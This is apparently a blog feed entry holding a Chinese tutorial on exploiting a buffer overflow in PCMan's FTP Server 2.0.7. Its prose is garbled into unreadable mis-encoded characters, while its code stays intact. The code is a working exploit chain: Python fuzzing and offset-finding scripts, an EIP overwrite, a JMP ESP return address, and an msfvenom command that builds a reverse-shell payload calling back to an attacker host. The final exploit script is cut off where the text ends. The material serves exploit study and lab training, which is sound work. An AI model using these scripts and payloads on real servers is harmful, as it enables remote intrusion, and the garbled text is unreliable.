    <summary type="html">This post is encryped.</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>PCMan&#39;s FTP Serverç¼“å†²åŒºæº¢å‡ºåˆ†æä¸åˆ©ç”¨</title>
    <link href="https://taonn.github.io/2020/11/16/PCMan-s-FTP-Server%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
    <id>https://taonn.github.io/2020/11/16/PCMan-s-FTP-Server%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</id>
    <published>2020-11-16T06:43:43.000Z</published>
    <updated>2021-03-16T05:31:50.528Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h2><blockquote><p>WindowsXP-SP3ï¼ˆ<code>PCManâ€™s FTP Server 2.0.7</code>ï¼Œ <code>Immunityinc debugger</code>, ï¼‰</p><p>æ”»å‡»æœºï¼škali 2.0</p></blockquote><p>éœ€è¦çš„åŸºç¡€ï¼š<code>å¯¹x86æ±‡ç¼–è¯­è¨€æœ‰ä¸€å®šçš„äº†è§£</code>ï¼Œ<code>pythonåŸºç¡€</code>ï¼Œå¸¸ç”¨è°ƒè¯•å·¥å…·çš„ä½¿ç”¨</p><h2 id="ç¼“å†²åŒºæº¢å‡ºåŸºç¡€"><a href="#ç¼“å†²åŒºæº¢å‡ºåŸºç¡€" class="headerlink" title="ç¼“å†²åŒºæº¢å‡ºåŸºç¡€"></a>ç¼“å†²åŒºæº¢å‡ºåŸºç¡€</h2><p>è¯¦æƒ…å‚è€ƒï¼š<a href="http://www.ywboy.cn/2020/10/06/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-%E4%B8%80/">ç¼“å†²åŒºæº¢å‡ºåŸç†åˆ†æ(ä¸€)</a></p><p>â€‹    ç®€å•çš„æ¥è¯´ï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥çš„æ•°æ®é•¿åº¦è¶…è¿‡äº†å¼€å‘äººå‘˜å®šä¹‰çš„ç¼“å†²åŒºï¼Œé‚£ä¹ˆè¿™ä¸ªæ•°æ®å°±å¯ä»¥è¦†ç›–æ‰å…³é”®çš„å¯„å­˜å™¨ï¼Œå¦‚EIPï¼ŒEIPæ˜¯æŒ‡ä»¤å¯„å­˜å™¨ï¼Œå®ƒå­˜æ”¾å½“å‰æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚å¦‚æœå®ƒè¢«æ¥è‡ªç”¨æˆ·è¾“å…¥çš„åƒåœ¾æ•°æ®è¦†ç›–äº†ï¼Œç¨‹åºé€šå¸¸ä¼šå´©æºƒï¼Œå› ä¸ºå®ƒè·³è½¬åˆ°çš„åœ°å€å¹¶å°è¯•æŒ‡å‘ï¼Œä½†æ‰§è¡Œçš„å¹¶ä¸æ˜¯æœ‰æ•ˆçš„æŒ‡ä»¤ã€‚æˆ‘ä»¬çš„ç›®çš„å°±æ˜¯è¦å®šåˆ¶ä¸€ä¸ªæ•°æ®å‘é€åˆ°ç¨‹åºè¦†ç›–EIPï¼Œä½¿ç¨‹åºè·³è½¬åˆ°æˆ‘ä»¬æ§åˆ¶çš„ä½ç½®ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œshellcodeäº†</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/overflow.png" alt="img"></p><blockquote><p>å›¾ç‰‡æ¥æºï¼š<a href="http://www.legendsec.org/2020.html">http://www.legendsec.org/2020.html</a></p></blockquote><h2 id="æŸ¥æ‰¾ç¼“å†²åŒºæº¢å‡º"><a href="#æŸ¥æ‰¾ç¼“å†²åŒºæº¢å‡º" class="headerlink" title="æŸ¥æ‰¾ç¼“å†²åŒºæº¢å‡º"></a>æŸ¥æ‰¾ç¼“å†²åŒºæº¢å‡º</h2><h3 id="æ¨¡ç³Šæµ‹è¯•-Fuzzing"><a href="#æ¨¡ç³Šæµ‹è¯•-Fuzzing" class="headerlink" title="æ¨¡ç³Šæµ‹è¯•(Fuzzing)"></a>æ¨¡ç³Šæµ‹è¯•(Fuzzing)</h3><p>è¦å®Œæˆä¸€æ¬¡ç¼“å†²åŒºæº¢å‡ºæµ‹è¯•ï¼Œæˆ‘ä»¬å°±éœ€è¦çŸ¥é“å“ªé‡Œä¼šå‘ç”Ÿç¼“å†²åŒºæº¢å‡ºï¼Œæ­¤æ—¶æˆ‘ä»¬å°±éœ€è¦è¿›è¡Œæ¨¡ç³Šæµ‹è¯•(fuzzing),ç°åœ¨æˆ‘ä»¬éœ€è¦å‘é€ä¸åŒé•¿åº¦å’Œå†…å®¹çš„è‡ªå®šä¹‰å­—ç¬¦ä¸²æ‰¾åˆ°æˆ‘ä»¬è¦æµ‹è¯•çš„è¾“å…¥ç‚¹ï¼Œå¦‚æœç¨‹åºå´©æºƒ,é‚£ä¹ˆæˆ‘ä»¬å°±ä½¿ç”¨è°ƒè¯•å·¥å…·è°ƒæŸ¥ä¸€ä¸‹ä¸ºä»€ä¹ˆä¼šå´©æºƒï¼Œå¯ä¸å¯ä»¥åˆ©ç”¨,è¿™é‡Œæˆ‘ä»¬ä»¥<code>PCManâ€™s FTP Server 2.0.7</code>ä¸ºä¾‹å­</p><p>é¦–å…ˆæˆ‘ä»¬æ¥æµ‹è¯•ä¸€ä¸‹ç”¨æˆ·åè¿™ä¸ªè¾“å…¥ç‚¹æœ‰æ²¡æœ‰å­˜åœ¨é—®é¢˜ã€‚è¿™é‡Œæˆ‘ä»¬ç”¨Pythonç¼–å†™äº†ä¸€ä¸ªFuzzerç¨‹åº</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">host = sys.argv[<span class="number">1</span>] <span class="comment"># receive IP</span></span><br><span class="line">port = int(sys.argv[<span class="number">2</span>])<span class="comment"># receive port</span></span><br><span class="line">fuzz = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((host, port))</span><br><span class="line">        s.settimeout(<span class="number">2</span>)</span><br><span class="line">        s.send(<span class="string">&quot;USER &quot;</span> + <span class="string">&quot;A&quot;</span> * fuzz)</span><br><span class="line">        s.recv(<span class="number">1024</span>)</span><br><span class="line">        s.send(<span class="string">&quot;PASS Tao&quot;</span>)</span><br><span class="line">        s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Send str length: &quot;</span> + str(fuzz)</span><br><span class="line">        fuzz += <span class="number">100</span></span><br><span class="line">    <span class="keyword">except</span> Exception,err:</span><br><span class="line">        <span class="keyword">print</span><span class="string">&quot;End..., Send str length: &quot;</span> + str(fuzz)</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        s.close()</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæˆ‘ä»¬æ‰“å¼€PCmanFTPè¿è¡Œç¨‹åºï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116105219299.png" alt="image-20201116105219299"></p><p>ä½¿ç”¨<code>./fuzzing.py 172.16.10.156 21</code>, è¿è¡Œè„šæœ¬ï¼Œå‘ç°å‘é€åˆ°å¤§çº¦2000çš„æ—¶å€™æŒ‚èµ·äº†ï¼Œæ£€æŸ¥æˆ‘ä»¬çš„FTPæœåŠ¡å™¨ï¼Œå¯ä»¥å‘ç°å·²ç»å´©æºƒã€‚</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116105359862.png" alt="image-20201116105359862"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±è¦æ¥è¿›ä¸€æ­¥ç ”ç©¶ä¸€ä¸‹ï¼Œç¡®è®¤è¿™é”™è¯¯æ˜¯å¦å¯ä»¥åˆ©ç”¨ï¼Œæˆ‘ä»¬é‡æ–°å¯åŠ¨<code>PCmanFTP</code>ç¨‹åº</p><h3 id="å´©æºƒè°ƒæŸ¥"><a href="#å´©æºƒè°ƒæŸ¥" class="headerlink" title="å´©æºƒè°ƒæŸ¥"></a>å´©æºƒè°ƒæŸ¥</h3><p>æ‰“å¼€<code>Immunityinc debugger</code>ï¼Œç„¶å<code>File-&gt;Attach</code> (é¦–å…ˆè¦ç¡®ä¿FTPç¨‹åºå·²ç»åœ¨è¿è¡Œ) </p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116105643048.png" alt="image-20201116105643048"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116105741533.png" alt="image-20201116105741533"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116105757588.png" alt="image-20201116105757588"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œæ­¤æ—¶ç¨‹åºå·²ç»åŠ è½½è¿›æ¥ï¼Œæ˜¯æš‚åœçŠ¶æ€ï¼Œ æˆ‘ä»¬ä½¿ç”¨å¿«æ·é”®<code>F9</code>è®©ç¨‹åºè·‘èµ·æ¥ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨èœå•æ çš„è¿è¡ŒæŒ‰é’®</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116105907120.png" alt="image-20201116105907120"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116105943781.png" alt="image-20201116105943781"></p><p>å½“ç¨‹åºå¤„äº<code>Running</code>çŠ¶æ€çš„æ—¶å€™ï¼Œæˆ‘ä»¬å†ä¸€æ¬¡è¿è¡Œ<code>fuzzing.py</code>è„šæœ¬ã€‚</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116110423713.png" alt="image-20201116110423713"></p><p>æ­¤æ—¶æˆ‘ä»¬ç¨‹åºå´©æºƒï¼Œä½†æ˜¯è¿™é‡Œçš„<code>EIP</code>å€¼å¹¶æ²¡æœ‰è¦†ç›–æˆæˆ‘ä»¬æƒ³è¦<code>41414141</code>, ä½†æ˜¯æ ¹æ®ç¨‹åºè¾“å‡ºæˆ‘ä»¬å¯çŸ¥ï¼Œå‘é€å­—ç¬¦è¾¾åˆ°<code>2000</code>æ—¶ä½¿å¾—ç¨‹åºå´©æºƒï¼Œæ­¤æ—¶æˆ‘ä»¬çŒœæµ‹<code>2000</code>æ˜¯å¤§æ¦‚çš„æº¢å‡ºä½ç½®ï¼ˆå› ä¸ºè¿™é‡Œåˆšå¥½å¯¼è‡´äº†ç¨‹åºæº¢å‡ºï¼Œä½†å¹¶æ²¡æœ‰è¦†ç›–è¿”å›åœ°å€ï¼‰æˆ‘ä»¬å†ä¸€æ¬¡æµ‹è¯•ï¼Œè¿™æ¬¡æµ‹è¯•å°†æ­¥é•¿ä¿®æ”¹ä¸º<code>150</code>, ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">host = sys.argv[<span class="number">1</span>] <span class="comment"># receive IP</span></span><br><span class="line">port = int(sys.argv[<span class="number">2</span>])<span class="comment"># receive port</span></span><br><span class="line">fuzz = <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((host, port))</span><br><span class="line">        s.settimeout(<span class="number">2</span>)</span><br><span class="line">        s.send(<span class="string">&quot;USER &quot;</span> + <span class="string">&quot;A&quot;</span> * fuzz)</span><br><span class="line">        s.recv(<span class="number">1024</span>)</span><br><span class="line">        s.send(<span class="string">&quot;PASS Tao&quot;</span>)</span><br><span class="line">        s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Send str length: &quot;</span> + str(fuzz)</span><br><span class="line">        fuzz += <span class="number">150</span><span class="comment"># modify this</span></span><br><span class="line">    <span class="keyword">except</span> Exception,err:</span><br><span class="line">        <span class="keyword">print</span><span class="string">&quot;End..., Send str length: &quot;</span> + str(fuzz)</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        s.close()</span><br></pre></td></tr></table></figure><p>ç¨‹åºè¾“å‡ºï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116111221265.png" alt="image-20201116111221265"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116111250442.png" alt="image-20201116111250442"></p><p>ä¸Šå›¾æˆ‘ä»¬å¯ä»¥å‘ç°EIPå¯„å­˜å™¨çš„å€¼æ˜¯<code>41414141</code>ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥æ§åˆ¶<code>EIP</code>ï¼ˆè¿™ä¹Ÿæ„å‘³ç€æˆ‘ä»¬ä¸Šé¢çš„çŒœæƒ³æ˜¯æ­£ç¡®çš„ï¼‰ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬è¦è§£å†³çš„é—®é¢˜å°±æ˜¯å“ªé‡Œçš„Aå°†EIPè¦†ç›–äº†å‘¢ï¼Ÿ</p><h3 id="æŸ¥æ‰¾åç§»æ•°ï¼ˆFinding-the-offsetï¼‰"><a href="#æŸ¥æ‰¾åç§»æ•°ï¼ˆFinding-the-offsetï¼‰" class="headerlink" title="æŸ¥æ‰¾åç§»æ•°ï¼ˆFinding the offsetï¼‰"></a>æŸ¥æ‰¾åç§»æ•°ï¼ˆFinding the offsetï¼‰</h3><p>ä½¿ç”¨Metasploitçš„pattern_createå·¥å…·åˆ›å»ºä¸€ä¸ª500å¤§å°çš„å­—ç¬¦ä¸²ï¼Œ</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116111938456.png" alt="image-20201116111938456"></p><p> å› ä¸ºæˆ‘ä»¬é€šè¿‡ä¸Šé¢çš„æµ‹è¯•ï¼Œå¤§æ¦‚åˆ¤æ–­æº¢å‡ºå­—ç¬¦åœ¨<code>1900~2050</code>, é‚£ä¹ˆæˆ‘ä»¬å¡«å†™<code>&#39;A&#39; * 1900 + &quot;å·¥å…·ç”Ÿæˆå­—ç¬¦&quot; </code>æ„æˆpayloadå‘é€è‡³FTPæœåŠ¡ç«¯ï¼Œå¦‚ä¸Šæ“ä½œï¼Œæˆ‘ä»¬è®©ç¨‹åºåœ¨<code>Immunityinc debugger</code>ä¸­è¿è¡Œèµ·æ¥,ç„¶åæ‰§è¡Œå¦‚ä¸‹ç¨‹åºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># filename: findoffset.py</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">1900</span> + <span class="string">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq&quot;</span></span><br><span class="line"></span><br><span class="line">host = sys.argv[<span class="number">1</span>] <span class="comment"># receive IP</span></span><br><span class="line">port = int(sys.argv[<span class="number">2</span>])<span class="comment"># receive port</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((host, port))</span><br><span class="line">s.send(<span class="string">&quot;USER &quot;</span> + payload)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">&quot;PASS Tao&quot;</span>)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116112858912.png" alt="image-20201116112858912"></p><p>å¯ä»¥å‘ç°ï¼Œè¿™ä¸€æ¬¡EIPå¯„å­˜å™¨çš„å€¼æ˜¯<code>0x34644133</code>, ä¸ºäº†è®¡ç®—è¿™ä¸ªå€¼åç§»é‡ï¼Œæˆ‘ä»¬ä½¿ç”¨Metasploitä¸­çš„å¦ä¸€ä¸ªå·¥å…·<code>pattern_offset</code>æ¥ç¡®å®šå­—èŠ‚æ•°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./pattern_offset.rb -l 500 -q 34644133</span><br><span class="line"><span class="comment"># -qå‚æ•°ä¸ºè¦æŸ¥è¯¢çš„åœ°å€ï¼Œ-lå‚æ•°ä¸ºè¦æŸ¥è¯¢çš„å­—ç¬¦åºåˆ—çš„é•¿åº¦</span></span><br><span class="line"><span class="comment"># ä¸Šå›¾ä¸­æˆ‘ä»¬å¾—å‡ºçš„åœ°å€æ˜¯ 0x34644133, è€Œç”Ÿæˆçš„å­—ç¬¦ä¸²é•¿åº¦ä¸º500ï¼Œ å› æ­¤è¿™é‡Œä½¿ç”¨ -l 500 -q 34644133</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116134108549.png" alt="image-20201116134108549"></p><p>è®¡ç®—ç»“æœä¸º<code>101</code>, ä¹Ÿå°±æ˜¯è¯´è¦†ç›–è¿”å›åœ°å€æ˜¯åœ¨<code>[2002-2005]</code> è¿™å››ä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬æ¥éªŒè¯ä¸€ä¸‹ï¼š</p><blockquote><p>æ³¨æ„ï¼Œä¸‹å›¾çš„1900 æ˜¯æˆ‘ä»¬ä¸Šé¢findoffset.pyè¿™ä¸ªç¨‹åºpyloadä¸­çš„Aå­—ç¬¦æ•°ï¼Œè€Œåç§»é‡ä¸º101ï¼Œé‚£ä¹ˆæœ€ç»ˆè¦†ç›–EIPå‰çš„å­—ç¬¦æ•°å°±æ˜¯1900+101=2001ä¸ªå­—ç¬¦</p></blockquote><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116134446739.png" alt="image-20201116134446739"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># filename: overeip.py</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">2001</span> + <span class="string">&quot;B&quot;</span> * <span class="number">4</span></span><br><span class="line">host = sys.argv[<span class="number">1</span>] <span class="comment"># receive IP</span></span><br><span class="line">port = int(sys.argv[<span class="number">2</span>])<span class="comment"># receive port</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((host, port))</span><br><span class="line">s.send(<span class="string">&quot;USER &quot;</span> + payload)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">&quot;PASS Tao&quot;</span>)</span><br><span class="line">s.recv(<span class="number">1024</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116135115486.png" alt="image-20201116135115486"></p><p>æ‰§è¡Œç¨‹åºï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116135306161.png" alt="image-20201116135306161"></p><p>æŸ¥çœ‹windows xpï¼Œå‘ç°EIPï¼ˆç¨‹åºè¿”å›åœ°å€ï¼‰è¢«æˆ‘ä»¬ä¸Šé¢çš„4ä¸ªBç»™è¦†ç›–äº†ï¼Œåˆ°è¿™ä¸€æ­¥ï¼Œæˆ‘ä»¬å·²ç»å¯ä»¥ç²¾ç¡®çš„è¦†ç›–EIPäº†</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116135248117.png" alt="image-20201116135248117"></p><h2 id="å¯»æ‰¾shellcodeä½ç½®"><a href="#å¯»æ‰¾shellcodeä½ç½®" class="headerlink" title="å¯»æ‰¾shellcodeä½ç½®"></a>å¯»æ‰¾shellcodeä½ç½®</h2><p>æˆ‘ä»¬åœ¨ä¸Šé¢ç¨‹åºpyloadåé¢åŠ 100ä¸ªCï¼Œç„¶åæ‰§è¡Œ</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116140101236.png" alt="image-20201116140101236"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡ŒESPæŒ‡å‘çš„æ˜¯æˆ‘ä»¬åœ¨EIPåé¢ç»™çš„<code>100ä¸ªC</code>, ç°åœ¨æˆ‘ä»¬æ˜¯è¦å°†Cæ›¿æ¢æˆæˆ‘ä»¬å¸Œæœ›è¿è¡Œçš„Shellcodeã€‚ç„¶åè®©EIPè·³è½¬åˆ°ESPå¯„å­˜å™¨çš„ä½ç½®</p><h2 id="è·å¾—-EIP-to-jump"><a href="#è·å¾—-EIP-to-jump" class="headerlink" title="è·å¾— EIP to jump"></a>è·å¾— EIP to jump</h2><p>ä¸ºä»€ä¹ˆæˆ‘ä»¬ä¸èƒ½å‘Šè¯‰EIPå»å†…å­˜åœ°å€0x0012EDB8å‘¢ï¼Ÿå› ä¸ºè¿™ä¸ªåœ°å€åœ¨å„ä¸ªè®¡ç®—æœºä¸Šéƒ½ä¸ä¸€æ ·å¾—ï¼Œä½ ä¸å¯èƒ½åªæƒ³è¿™ä¸ªæ”»å‡»åªèƒ½æ”»å‡»è‡ªå·±è®¡ç®—æœºå§ã€‚æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å°±è¦åœ¨ç¨‹åºçš„dllä¸­æ‰¾åˆ°å…·æœ‰JMP ESPå‘½ä»¤çš„å†…å­˜åœ°å€ã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å°†EIPæŒ‡å‘è¯¥ä½ç½®ï¼Œä½¿å…¶è·³è½¬åˆ°æˆ‘ä»¬çš„ç¼“å†²åŒºä¸­ã€‚</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116140431546.png" alt="image-20201116140431546"></p><p>æˆ‘ä»¬è¿™é‡Œä½¿ç”¨<code>Immunityinc debugger</code> åœ¨ç¨‹åºçš„dllä¸­æ‰¾åˆ°å…·æœ‰<code>JMP ESP</code>å‘½ä»¤çš„å†…å­˜åœ°å€</p><p>çœ‹çœ‹æœ‰å“ªäº›dllåŠ è½½åˆ°äº†è¿™ä¸ªç¨‹åº</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116140845375.png" alt="image-20201116140845375"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116140901583.png" alt="image-20201116140901583"></p><p>è¿™é‡Œæˆ‘ä»¬é€‰æ‹©<code>kernel32.dll</code> è¿›è¡Œæœç´¢ï¼Œ æœç´¢JMP ESPå‘½ä»¤</p><p><code>å³é”®-&gt; Search for -&gt; Command -&gt; è¾“å‡ºjmp esp æœç´¢</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116141504015.png" alt="image-20201116141504015"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116141557567.png" alt="image-20201116141557567"></p><p>è¿™é‡Œè¿”å›çš„å†…å­˜åœ°å€ä¸º<code>0x7C86467B</code>, è¿™ä¸ªåœ°å€æ²¡æœ‰åå­—ç¬¦ï¼ˆåå­—ç¬¦æ˜¯ä¼šç ´åæˆ‘ä»¬æ¼æ´çš„å­—ç¬¦ï¼Œå¦‚<code>0x00</code>ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥æ¥åˆ©ç”¨,å› ä¸ºè¿™é‡Œæˆ‘ä»¬æ˜¯å°ç«¯æ˜¾ç¤ºï¼Œæ‰€ä»¥æ„é€ shellcodeçš„æ—¶å€™éœ€è¦å€’è¿‡æ¥å†™ï¼</p><h2 id="ç”Ÿæˆshellcode"><a href="#ç”Ÿæˆshellcode" class="headerlink" title="ç”Ÿæˆshellcode"></a>ç”Ÿæˆshellcode</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=172.16.10.143 LPORT=1234 EXITFUNC=thread -f python -b <span class="string">&quot;\x00\x0a\x0d&quot;</span> -a x86</span><br><span class="line"><span class="comment"># 0x0Aè¡¨ç¤ºå›è½¦ï¼Œ0x0Dè¡¨ç¤ºæ¢è¡Œï¼Œ0x00è¡¨ç¤ºå­—ç¬¦ä¸²çš„ç»“æŸï¼Œ è¿™äº›éƒ½æ˜¯åå­—ç¬¦ï¼Œä¼šç ´ç¯æˆ‘ä»¬çš„payload</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201116142804801.png" alt="image-20201116142804801"></p><p>æˆ‘ä»¬åœ¨æœ€åè·³è½¬åœ°å€åŠ å…¥è‹¥å¹²NOPå­—ç¬¦ï¼ŒNOPä»£è¡¨è·³è¿‡ï¼Œæ„å‘³ç€ä»€ä¹ˆéƒ½ä¸éœ€è¦æ“ä½œï¼Œå¹¶ä¸”æŒ‡ç¤ºCPUè·³è¿‡æ­¤æŒ‡ä»¤ã€‚æœ‰æ—¶å€™å¯ä»¥é€šè¿‡åœ¨shellcodeå‰å¡«å……NOPå¢åŠ æ¼æ´åˆ©ç”¨ç¨‹åºå’Œshellcodeå¯é æ€§ã€‚è¿™é‡Œæˆ‘æ·»åŠ 30ä¸ªNOPï¼Œä»¥æé«˜å¯é æ€§ã€‚æœ€ç»ˆexpç¨‹åºä¸ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 